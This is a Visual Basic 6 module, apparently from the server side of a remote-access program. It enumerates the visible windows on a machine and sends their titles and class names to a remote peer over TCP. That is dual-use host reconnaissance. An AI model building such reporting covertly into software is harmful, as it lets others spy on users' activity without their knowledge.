Attribute VB_Name = "modProcess"
Private Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function IsWindow& Lib "user32" (ByVal hwnd As Long)
Private Declare Function IsWindowVisible& Lib "user32" (ByVal hwnd As Long)
Private Declare Function GetParent& Lib "user32" (ByVal hwnd As Long)

Dim strTemp As String

Private Function GetWndText(hwnd As Long) As String 'gets the window text
  Dim k As Long, sName As String
  sName = Space$(128)
  k = GetWindowText(hwnd, sName, 128)
  If k > 0 Then sName = Left$(sName, k) Else sName = "No caption"
  GetWndText = sName
End Function

Function EnumWinProc(ByVal hwnd As Long, ByVal lParam As Long) As Long 'the good 'ol enumwindows....
  Dim sName As String
  If IsWindowVisible(hwnd) And GetParent(hwnd) = 0 Then
     sName = GetWndText(hwnd)
     If sName = "No caption" Then sName = sName & " (Class name: " & GetWndClass(hwnd) & ")"
     strTemp = strTemp & sName & vbCrLf
  End If
  EnumWinProc = 1
End Function

Public Sub FillWindows() 'the sub for listing windows...
  EnumWindows AddressOf EnumWinProc, 0
  Form1.TCP.SendData vbCrLf + "Server Task Listing..." + vbCrLf
Form1.TCP.SendData "Processes" & "|" & strTemp
  strTemp = ""
  Form1.TCP.SendData vbCrLf
End Sub

Private Function GetWndClass(hwnd As Long) As String 'gets the windows class...
  Dim k As Long, sName As String
  sName = Space$(128)
  k = GetClassName(hwnd, sName, 128)
  If k > 0 Then sName = Left$(sName, k) Else sName = "No class"
  GetWndClass = sName
End Function

